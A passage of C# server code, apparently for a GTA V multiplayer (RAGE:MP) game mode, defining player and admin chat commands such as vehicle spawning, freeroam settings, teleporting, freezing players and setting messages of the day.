                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Random rand = new Random(DateTimeOffset.UtcNow.Millisecond);

            Vehicle aVehicle = NAPI.Vehicle.CreateVehicle(NAPI.Util.GetHashKey(carname), player.Position.Around(5.0f), player.Heading, col1 == -1 ? rand.Next(160) : col1, col2 == -1 ? rand.Next(160) : col2, player.Name, 255, false, true, player.Dimension);
            aVehicle.EngineStatus = true;
            aVehicle.SetSharedData("Engine", true);
            aVehicle.SetSharedData("Locked", false);
            aVehicle.Locked = false;
            aVehicle.SetSharedData("Team", -1);

            Settings.AdminVehicles.Add(aVehicle);

            NAPI.Task.Run(() =>
            {
                lock (player)
                {
                    if (player != null && player.Exists)
                    {
                        if (!aVehicle.IsNull && aVehicle.Exists) player.SetIntoVehicle(aVehicle, 0);
                    }
                }
            }, 1000);

            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
            if (lobby.Fugitives.Contains(player) || lobby.Cops.Contains(player))
            {
                Logs.LogAdmin(player, "Spawned a vehicle while in copchase: " + carname.ToUpper());
            }
            else Logs.LogAdmin(player, "Spawned a vehicle: " + carname.ToUpper());
            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:aveh:{carname.Replace(":", "|")}"); } catch { }
            return;
        }

        [Command("veh", "!{#AFAFAF}[USAGE] veh (vehicle model) (optional: pri. color) (optional: sec. color)", Alias = "v")]
        public void cmd_veh(Player player, string carname, int col1 = -1, int col2 = -1)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") != -3 || player.Dimension < 256 || player.Dimension > 512)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            List<Vehicle> freeroamVehs = new List<Vehicle>();
            freeroamVehs = player.GetData<List<Vehicle>>("FreeroamVehicles");

            if (freeroamVehs.Count >= 5)
            {
                Vehicle veh = freeroamVehs.First();
                freeroamVehs.Remove(veh);
                veh.Delete();
                player.SendNotification("~r~You had too many freeroam vehicles, removed the least recent.");
            }

            Random rand = new Random(DateTimeOffset.UtcNow.Millisecond);

            //// try { Main.Log("freeroam.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:veh:{carname}"); } catch { }

            Vehicle aVehicle = NAPI.Vehicle.CreateVehicle(NAPI.Util.GetHashKey(carname), player.Position.Around(5.0f), player.Heading, (col1 == -1) ? rand.Next(160) : col1, (col2 == -1) ? rand.Next(160) : col2, player.Name, 255, false, true, player.Dimension);
            aVehicle.SetSharedData("Locked", false);
            aVehicle.Locked = false;
            aVehicle.EngineStatus = true;
            aVehicle.SetSharedData("Engine", true);

            aVehicle.SetSharedData("Team", -1);

            freeroamVehs.Add(aVehicle);

            player.SetData("FreeroamVehicles", freeroamVehs);

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}>> !{#FFFFFF}You have spawned a " + carname + " at your current location.");

            NAPI.Task.Run(() =>
            {
                lock (player)
                {
                    if (player != null && player.Exists)
                    {
                        if (!aVehicle.IsNull && aVehicle.Exists) player.SetIntoVehicle(aVehicle, 0);
                    }
                }
            }, 1000);

            return;
        }

        [Command("mytime", "!{#AFAFAF}[USAGE] mytime (hour)", Alias = "myt")]
        public void cmd_mytime(Player player, int hour)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") != -3 || player.Dimension < 256 || player.Dimension > 512)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            if (hour < 0 || hour > 23)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Hours are between 0-23.");
                return;
            }

            player.SetData("FreeroamTime", hour);
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}>> !{#FFFFFF}You have set your time/hour to " + hour + ".");

            player.TriggerEvent("SetTimeWeather", player.GetData<int>("FreeroamTime"), 0, 0, player.GetData<int>("FreeroamWeather"));

            return;
        }

        [Command("myweather", "!{#AFAFAF}[USAGE] myweather (weatherid)", Alias = "myw")]
        public void cmd_myweather(Player player, int weatherid)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") != -3 || player.Dimension < 256 || player.Dimension > 512)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                player.TriggerEvent("pushMsgToChat", "~g~HINT:~w~ You can change your weather in the ~y~Menu > Settings~w~.");
                return;
            }

            if (weatherid < 0 || weatherid > 9)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Weather ID's are between 0-9.");
                return;
            }

            player.SetData("FreeroamWeather", weatherid);
            player.TriggerEvent("SetTimeWeather", player.GetData<int>("FreeroamTime"), 0, 0, player.GetData<int>("FreeroamWeather"));




            return;
        }

        [Command("togblip")]
        public void cmd_togblip(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if ((player.GetSharedData<int>("InLobby") == -3 && player.Dimension >= 256 && player.Dimension <= 512) == false && EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            player.SetData("FreeroamBlip", !player.GetData<bool>("FreeroamBlip"));
            player.SetSharedData("VisibleBlip", player.GetData<bool>("FreeroamBlip"));

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}>> !{#FFFFFF}You have " + (player.GetData<bool>("FreeroamBlip") == true ? "enabled" : "disabled") + " your freeroam minimap blip.");
            return;
        }

        [Command("godmode")]
        public void cmd_godmode(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if ((player.GetSharedData<int>("InLobby") == -3 && player.Dimension >= 256 && player.Dimension <= 512) == false && EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            player.SetData("FreeroamGodmode", !player.GetData<bool>("FreeroamGodmode"));
            player.TriggerEvent("SetActorInvulnerable", player.GetData<bool>("FreeroamGodmode"));

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}>> !{#FFFFFF}You have " + (player.GetData<bool>("FreeroamGodmode") == true ? "enabled" : "disabled") + " freeroam godmode.");
            return;
        }

        [Command("afob")]
        public void cmd_afob(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if ((player.GetSharedData<int>("InLobby") == -3 && player.Dimension >= 256 && player.Dimension <= 512) == false && EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            if (player.HasData("FreeroamAFOB"))
            {
                player.ResetData("FreeroamAFOB");
                player.TriggerEvent("ToggleAFOB", false, 999);
            }
            else
            {
                player.SetData("FreeroamAFOB", true);
                player.TriggerEvent("ToggleAFOB", true, 999);
            }

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}>> !{#FFFFFF}You have " + (player.HasData("FreeroamAFOB") ? "enabled" : "disabled") + " anti fall off bike.");
            return;
        }

        [Command("setspawn")]
        public void cmd_setspawn(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if ((player.GetSharedData<int>("InLobby") == -3 && player.Dimension > 256 && player.Dimension <= 512) == false && EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam or you are in the default world!");
                return;
            }

            Settings.FreeroamSpawns.RemoveAll(a => a.ID == player.GetData<uint>("FreeroamWorld"));

            Settings.FreeroamSpawns.Add(new SpawnSet(player.GetData<uint>("FreeroamWorld"), player.Position.X, player.Position.Y, player.Position.Z, player.Heading));

            foreach (Player p in Settings.LoggedInPlayers.Where(a => a.GetData<uint>("FreeroamWorld") == player.GetData<uint>("FreeroamWorld")))
            {
                p.TriggerEvent("pushMsgToChat", "!{#FF6347}>> !{#FFFFFF}" + player.Name + " has changed the spawn of this freeroam world.");
            }

            //// try { Main.Log("freeroam.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:setspawn:{player.Dimension-(uint)256}"); } catch { }

            return;
        }

        [Command("gps", Alias = "bk")]
        public static void cmd_gps(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            bool isACop = false;
            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
            if (lobby != null)
            {
                if (lobby.Cops.Contains(player) && lobby.gameStatus == 1)
                {
                    isACop = true;
                }
            }

            if (!isACop)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a cop.");
                return;
            }

            player.SetData("GPS", !player.GetData<bool>("GPS"));
            player.SetSharedData("VisibleBlip", player.GetData<bool>("GPS"));

            player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have " + (player.GetData<bool>("GPS") == true ? "enabled" : "disabled") +
                " your emergency GPS beacon.");

            return;
        }

        [Command("dl", Alias = "vinfo,vehdebug,vehinfo")]
        public static void cmd_dl(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<bool>("VehicleDL") == true)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}DL (vehicle info displayer) has been disabled.");
                player.SetSharedData("VehicleDL", false);
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[>] !{#FFFFFF}DL (vehicle info displayer) has been enabled.");
                player.SetSharedData("VehicleDL", true);
            }
            return;
        }

        [Command("motd", "!{#AFAFAF}[USAGE] motd (player name)(message | 'none' to delete)", GreedyArg = true)]
        public void cmd_motd(Player player, string targetName, string message)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Player targetPlayer = null;
            foreach (Player pl in Settings.LoggedInPlayers)
            {
                if (pl.Name.Equals(targetName, StringComparison.OrdinalIgnoreCase))
                {
                    targetPlayer = pl;
                    break;
                }
            }
            if (targetPlayer == null)
            {

                Task.Run(async () =>
                {
                    using (MainDatabase context = ContextFactory.CreateContext())
                    {
                        Account targetAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(t => t.Username.Equals(targetName, StringComparison.OrdinalIgnoreCase));
                        motd_onFinishAccountLookup(player, targetAcc, message);
                    }
                });
            }
            else
            {
                MOTDData newMotd = new MOTDData()
                {
                    AdminName = player.Name,
                    PostedOn = DateTime.Now.ToString(),
                    Message = message
                };
                Main.DisplayMOTD(targetPlayer, newMotd);
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You set a MOTD for " + targetPlayer.Name + " & it has been shown to them!");
            }
        }
        private void motd_onFinishAccountLookup(Player player, Account targetAcc, string message)
        {
            NAPI.Task.Run(async () =>
            {
                if (targetAcc == null)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}A player with that username could not be found in the database!");
                    return;
                }

                if (message.Equals("none"))
                {
                    targetAcc.MOTD = "none";
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You successfully deleted " + targetAcc.Username + "'s MOTD.");
                    ContextFactory.SaveDB();
                    return;
                }
                MOTDData newMotd = new MOTDData()
                {
                    AdminName = player.Name,
                    PostedOn = DateTime.Now.ToString(),
                    Message = message
                };
                string jsonMotd = NAPI.Util.ToJson(newMotd);

                targetAcc.MOTD = jsonMotd;
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You set a MOTD for " + targetAcc.Username + " & they will see it when they login!");
                ContextFactory.SaveDB();
            });

        }

        [Command("motdall", "!{#AFAFAF}[USAGE] motdall (message | 'none' to delete)", GreedyArg = true)]
        public void cmd_motdall(Player player, string message)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (message.Equals("none"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You successfully deleted the server message of the day!");
                Task.Run(async () =>
                {
                    using (MainDatabase context = ContextFactory.CreateContext())
                    {
                        await context.Accounts.AsQueryable().AsQueryable().ForEachAsync(acc =>
                        {
                            acc.MOTD = "none";
                        });
                        await context.SaveChangesAsync();
                    }
                });
                return;
            }

            MOTDData newMotd = new MOTDData()
            {
                AdminName = player.Name,
                PostedOn = DateTime.Now.ToString(),
                Message = message
            };
            string jsonMotd = NAPI.Util.ToJson(newMotd);

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    await context.Accounts.AsQueryable().ForEachAsync(acc =>
                    {
                        acc.MOTD = jsonMotd;
                    });
                    await context.SaveChangesAsync();
                }
            });
            foreach (Player pl in Settings.LoggedInPlayers)
            {
                Main.DisplayMOTD(pl, newMotd);
            }
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You successfully updated the server message of the day!");
        }

        [Command("goto", "!{#AFAFAF}[USAGE] goto (target)")]
        public void cmd_goto(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin >= 1)
            {
                if (player.IsInVehicle)
                {
                    player.Vehicle.Position = target.Position.Around(5.0f);
                    player.Vehicle.Dimension = target.Dimension;
                }
                else
                {
                    player.Position = target.Position.Around(3.0f);
                }
                player.Dimension = target.Dimension;

                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has teleported to {target.Name}.");
                Logs.LogAdmin(player, $"Teleported to {target.Name}.");
                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:goto:{target.Name}"); } catch { }
            }
            else
            {
                if (player.GetSharedData<int>("InLobby") != -3)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] ~w~You must be an admin or in freeroam to use this command!");
                    return;
                }
                if (target.GetSharedData<int>("InLobby") != -3)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] ~w~Target is not in freeroam!");
                    return;
                }
                if (player.Dimension != target.Dimension)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] ~w~You are not in the same world as the target! (/world)");
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}>> ~w~Please don't bother/troll/grief players if they want to be alone in their world!");
                    return;
                }
                if (player.IsInVehicle)
                {
                    player.Vehicle.Position = target.Position.Around(5.0f);
                    player.Vehicle.Dimension = target.Dimension;
                }
                else
                {
                    player.Position = target.Position.Around(3.0f);
                }
                player.TriggerEvent("pushMsgToChat", $"!{{#C9C9C9}}You've teleported to {target.Name}'s position.");
                target.TriggerEvent("pushMsgToChat", $"!{{#C9C9C9}}{player.Name} has teleported to your position.");
            }
            return;
        }

        [Command("bring", "!{#AFAFAF}[USAGE] bring (target)", Alias = "gethere")]
        public void cmd_bring(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (target.GetSharedData<int>("InLobby") == -5)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is in customizer/character creator. Use /sendtolobby to force them out.");
                return;
            }

            Logs.LogAdmin(player, $"Summoned player {target.Name}.");
            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:bring:{target.Name}"); } catch { }

            if (target.IsInVehicle)
            {
                target.ResetData("Seatbelt");
                target.TriggerEvent("ToggleSeatbelt", false);
                target.Vehicle.Position = player.Position.Around(5.0f);
                target.Vehicle.Dimension = player.Dimension;
            }
            else
            {
                target.Position = player.Position.Around(3.0f);
            }
            target.Dimension = player.Dimension;

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has summoned {target.Name}.");
            return;
        }

        [Command("bringall", Alias = "gethereall")]
        public void cmd_bringall(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Logs.LogAdmin(player, "Summoned all players.");
            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:bringall"); } catch { }

            foreach (Player target in RAGE.Entities.Players.All)
            {
                target.Position = player.Position.Around(3.0f);
                target.Dimension = player.Dimension;
            }

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has summoned all the players.");
            return;
        }
        /*
        [Command("placespikes")]
        public void cmd_placespikes(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            LobbyData lobby = Settings.Lobbies.FirstOrDefault(l => l.lobbyId == player.GetSharedData<int>("InLobby"));
            if (lobby == null) return;
            
            if (!lobby.Cops.Contains(player))
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] ~w~You are not a cop!");
                return;
            }
            Account acc = EPlayer.GetAccount(player);
            if(acc.Level < 5)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] ~w~You must be at least level 5 to use this!");
                return;
            }
            if(player.GetSharedData<int>("Wounded") > 0 || player.Dead)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] ~w~You are wounded or dead!");
                return;
            }
            if(player.GetSharedData<bool>("PlacingStingers") == true)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] ~w~You are already deploying spikes!");
                EPlayer.SendMessage(player, "~b~[STINGERS] ~w~Walk to the position where the other end will be placed and press ~y~H~w~ to place them.");
                return;
            }

            player.TriggerEvent("Spikes_BeginPlacing");
            EPlayer.Action(player, "begins deploying stingers...");
            EPlayer.SendMessage(player, "~b~[STINGERS] ~w~You began the stingers deployment process...");
            EPlayer.SendMessage(player, "~b~[STINGERS] ~w~The first end of the stinger was set to your current position.");
            EPlayer.SendMessage(player, "~b~[STINGERS] ~w~Walk to the position where the other end will be placed and press ~y~ H ~w~ to place them.");
        }
        */
        /*
        [Command("archiveaccounts")]
        public void cmd_archiveaccounts(Player player, int inactive_days)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            if(inactive_days < 3 || inactive_days > 365)
            {
                EPlayer.SendMessage(player, "!{#FF6347}[!] ~w~The inactivity days must be between 3 and 365!");
                return;
            }

            List<Account> cunt = ContextFactory.Instance.Accounts.ToList().Where(a => (new DateTimeOffset(DateTime.Now).ToUnixTimeSeconds() - new DateTimeOffset(a.LastLogin).ToUnixTimeSeconds()) > (inactive_days* 86400)).ToList();
            if (cunt != null && cunt.Count > 0)
            {
                EPlayer.SendMessageToAll($"~b~[ACCOUNT ARCHIVE] ~w~{player.Name} has initiated the account archive process for all accounts inactive for more than {inactive_days} days!");
                EPlayer.SendMessageToAll("~b~[ACCOUNT ARCHIVE] ~w~There might be some server lag until this process is finished, which should last a few seconds.");         

                NAPI.Task.Run(() =>
                {
                    int archivedAccs = 0;
                    foreach (Player pl in NAPI.Pools.GetAllPlayers().Where(p => p.GetSharedData<int>("Team") > 0))
                    {
                        EPlayer.Notify(pl, "<strong>Account archiving in process...</strong> This will take a few seconds.", "orange", "fa-regular fa-server", false, 999999999, "center", "replace");
                        EPlayer.Freeze(pl, true);
                    }
                    foreach (Account acc in cunt)
                    {
                        acc.MOTD = NAPI.Util.ToJson(new MOTDData()
                        {
                            AdminName = player.Name,
                            Message = $"~b~[ACCOUNT ARCHIVE]~w~ Your account was archived by an admin because you were inactive for more than {inactive_days} days, but was now recovered.",
                            PostedOn = DateTime.Now.ToShortDateString()
                        });

                        if (BackupContextFactory.Instance.Accounts.FirstOrDefault(a => a.Username == acc.Username) == null)
                        {
                            BackupContextFactory.Instance.Accounts.Add(acc);

                            List<OwnedVehData> ownedVehs = ContextFactory.Instance.OwnedVehicles.ToList().Where(v => v.AccountSQLID == acc.SQL_ID).ToList();
                            List<OwnedLoadoutData> ownedLoadouts = ContextFactory.Instance.OwnedLoadouts.ToList().Where(v => v.AccountSQLID == acc.SQL_ID).ToList();
                            List<PlayerOutfit> savedOutfits = ContextFactory.Instance.PlayerOutfits.ToList().Where(v => v.AccountID == acc.SQL_ID).ToList();
                            List<PlayerTunings> savedTunings = ContextFactory.Instance.PlayerTunings.ToList().Where(v => v.AccountSQLID == acc.SQL_ID).ToList();
                            List<UnlockedAchievement> unlockedAchievements = ContextFactory.Instance.UnlockedAchievements.ToList().Where(v => v.AccountID == acc.SQL_ID).ToList();

                            BackupContextFactory.Instance.OwnedLoadouts.AddRange(ownedLoadouts);
                            BackupContextFactory.Instance.OwnedVehicles.AddRange(ownedVehs);
                            BackupContextFactory.Instance.PlayerOutfits.AddRange(savedOutfits);
                            BackupContextFactory.Instance.PlayerTunings.AddRange(savedTunings);
                            BackupContextFactory.Instance.UnlockedAchievements.AddRange(unlockedAchievements);

                            ContextFactory.Instance.PlayerOutfits.RemoveRange(savedOutfits);
                            ContextFactory.Instance.OwnedLoadouts.RemoveRange(ownedLoadouts);
                            ContextFactory.Instance.OwnedVehicles.RemoveRange(ownedVehs);
                            ContextFactory.Instance.PlayerTunings.RemoveRange(savedTunings);
                            ContextFactory.Instance.UnlockedAchievements.RemoveRange(unlockedAchievements);

                            ContextFactory.Instance.Accounts.Remove(acc);
                            archivedAccs++;

                            List<Logs_Session> records = ContextFactory.Instance.Logs_Session.ToList().Where(a => a.AccountID == acc.SQL_ID).ToList();
                            ContextFactory.Instance.Logs_Session.RemoveRange(records);
                        }
                    }

                    BackupContextFactory.Instance.SaveChanges();
                    ContextFactory.Instance.SaveChanges();
                    NAPI.Util.ConsoleOutput($"[ACCOUNT ARCHIVE] {archivedAccs} have been archived. Total accounts in archive: {BackupContextFactory.Instance.Accounts.Count()}");

                    foreach (Player pl in NAPI.Pools.GetAllPlayers())
                    {
                        if (EPlayer.LoggedIn(pl) == true)
                        {
                            EPlayer.Notify(pl, "<strong>Account archiving in process...</strong> This will take a few seconds.", "orange", "fa-regular fa-server", false, 1, "center", "replace");
                            EPlayer.Freeze(pl, false);
                        }
                    }
                    EPlayer.SendMessageToAll("~b~[ACCOUNT ARCHIVE] ~w~Account archive process ~g~finished~w~! You've been unfrozen.");
                }, 100);
                EPlayer.SendMessage(player, "~b~[ACCOUNT ARCHIVE] ~w~A total of ~y~" + cunt.Count + "~w~ accounts have been archived!");
            }
            else
            {
                EPlayer.SendMessage(player, "~r~[!]~w~ No accounts were found with inactivity days higher than " + inactive_days + "!");
                return;
            }
        }
        */

        [Command("freezeall")]
        public void cmd_freezeall(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Logs.LogAdmin(player, "Froze all players.");
            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:freezeall"); } catch { }

            foreach (Player target in RAGE.Entities.Players.All)
            {
                EPlayer.Freeze(target, true);
            }

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has frozen all the players.");
            return;
        }

        [Command("unfreezeall")]
        public void cmd_unfreezeall(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Logs.LogAdmin(player, "Unfroze all players.");
            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:unfreezeall"); } catch { }

            foreach (Player target in RAGE.Entities.Players.All)
            {
                EPlayer.Freeze(target, false);
            }

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has thawed all the players.");
            return;
        }

        [Command("sethpall", "!{#AFAFAF}[USAGE] sethpall (health) (armor)")]
        public void cmd_sethpall(Player player, int health, int armor)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Logs.LogAdmin(player, $"Set all players' HP & AR to {health} & {armor}.");
            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:sethpall:{health}:{armor}"); } catch { }

            foreach (Player target in RAGE.Entities.Players.All)
            {
                target.Health = health;
                target.Armor = armor;
            }

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has changed all player's health & ar.");
            return;
        }

        [Command("noclip", "!{#AFAFAF}[USAGE] noclip", GreedyArg = true)]
        public void cmd_noclip(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (player.HasData("IsNoclipping"))
            {
                player.SetSharedData("VisibleBlip", player.GetData<bool>("IsNoclipping"));
                player.ResetData("IsNoclipping");
                player.TriggerEvent("ForceNoclip", false);
                Logs.LogAdmin(player, "Left noclip mode.");
                player.SetSharedData("EntAlpha", 255);

                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:noclip:stop"); } catch { }
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Toggled noclip, actions:");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}LSHIFT: Boost | LCTRL: Slow | LSHIFT + CTRL: Very slow (adjustable)");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}/noclip_vsm (rate) (rate is in decimal like 0.10) -- will adjust very slow speed (for cinematic etc)");

                player.SetData("IsNoclipping", player.GetSharedData<bool>("VisibleBlip"));
                player.SetSharedData("VisibleBlip", false);
                player.TriggerEvent("ForceNoclip", true);
                Logs.LogAdmin(player, "Entered noclip mode.");
                player.SetSharedData("EntAlpha", 0);
                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:noclip:start"); } catch { }
            }
            return;
        }

        [Command("setalpha", "!{#AFAFAF}[USAGE] setalpha (target) (0-255)")]
        public void cmd_setalpha(Player player, Player target, int alpha)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            if (alpha < 0 || alpha > 255)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You good? This shit finna bring us to 4D, tone it down between 0-255.");
                return;
            }

            target.SetSharedData("EntAlpha", alpha);
            Logs.LogAdmin(player, $"Set {target.Name}'s alpha to {alpha}.");
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has set {target.Name}'s alpha (transparency) to {alpha}.");
            return;
        }

        [Command("setcaralpha", "!{#AFAFAF}[USAGE] setcaralpha (target) (0-255)")]
        public void cmd_setcaralpha(Player player, Player target, int alpha)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            if (alpha < 0 || alpha > 255)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You good? This shit finna bring us to 4D, tone it down between 0-255.");
                return;
            }
            if (!target.IsInVehicle)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The target is not in any vehicle.");
                return;
            }

            target.Vehicle.SetSharedData("EntAlpha", alpha);
            Logs.LogAdmin(player, $"Set {target.Name}'s vehicle alpha to {alpha}.");
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has set {target.Name}'s vehicle alpha (transparency) to {alpha}.");
            return;
        }

        [Command("chances", Alias = "fugichance,fugitivechance,fugitivechances,chance")]
        public void cmd_chances(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            player.TriggerEvent("pushMsgToChat", "!{#f0c311}Chance of becoming a fugitive next round: !{#FFFFFF}" + player.GetSharedData<float>("FugitiveChance").ToString("N2") + "%");
            player.TriggerEvent("pushMsgToChat", "!{#fa65b0}Highest chance in lobby: !{#FFFFFF}" + Settings.LoggedInPlayers.Where(p => p.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")).OrderByDescending(a => a.GetSharedData<float>("FugitiveChance")).First().GetSharedData<float>("FugitiveChance").ToString("N2") + "%");
        }

        [Command("togcols", "!{#AFAFAF}[USAGE] togcols (target)")]
        public void cmd_togcollision(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

